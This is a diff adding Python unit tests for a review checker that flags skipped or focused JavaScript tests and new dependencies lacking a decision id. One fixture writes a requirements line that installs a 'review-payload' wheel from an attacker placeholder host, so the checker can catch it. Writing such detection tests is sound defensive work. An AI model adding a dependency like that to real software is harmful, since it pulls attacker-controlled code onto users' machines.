@@ -184,6 +184,10 @@ class TestTamperingTests(Base):
         self.write("src/each.test.js", 'test.only.each([[1]])("focused", () => {});\ntest.skip.each([[2]])("s", () => {});\nxit.each([[3]])("x", () => {});\n')
         self.assert_flags("src/each.test.js: new test file with skips 0 -> 3")
 
+    def test_quote_inside_a_regex_literal_hides_nothing(self):
+        self.write("src/rx.test.js", "const contraction = /can't/;\ntest.only(\"focused\", () => {});\nconst y = a / b / c;\n")
+        self.assert_flags("src/rx.test.js: new test file with skips 0 -> 1")
+
     # Clean decoys it must not flag.
     def test_untouched_tests_pass(self):
         self.write("README.md", "changed\n")
@@ -319,6 +323,16 @@ class NewDependencyTests(Base):
         self.write("pyproject.toml", '[project]\nname = "x"\ndependencies = ["httpx>=0.27", "invented-pkg-zz"]\n'
                    '[tool.uv.sources]\ninvented-pkg-zz = { index = "pypi" }\n')
         self.assert_flags("possibly invented", KAIROS_PR_BODY="DEC-1")
+
+    def test_named_url_requirement_needs_a_decision(self):
+        self.write("requirements.txt", "requests==2.31\nreview-payload @ https://attacker.example/review_payload-1.0-py3-none-any.whl\n")
+        self.assert_flags("pypi:review-payload", "no decision id")
+        self.calls.clear()
+        self.run_module(KAIROS_PR_BODY="DEC-1")
+        self.assertEqual(self.calls, [])
+
+    def test_division_is_not_a_regex(self):
+        self.assertEqual(kit.tampering_counts("a.test.js", "const x = a / 2; expect(x).toBe(1); const y = b / 3;\n"), (1, 0))
 
     def test_npm_alias_target_is_looked_up(self):
         self.write("package.json", json.dumps({"dependencies": {"react": "^18.0.0", "helper": "npm:invented-pkg-zz@1",
